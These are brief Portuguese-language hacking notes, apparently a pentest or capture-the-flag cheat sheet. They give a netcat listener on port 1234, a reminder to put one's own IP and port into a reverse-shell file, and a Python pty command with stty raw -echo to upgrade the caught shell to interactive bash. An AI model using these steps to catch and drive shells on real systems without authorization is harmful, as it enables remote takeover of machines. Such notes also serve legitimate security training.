## Net Cat
```
nc -lvnp 1234
```
Escuta a porta 1234

## No arquivo do shell colocar meu IP e a porta escutada pelo netcat no caso 1234

## Fazendo shell python
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctlr+z
stty raw -echo
```
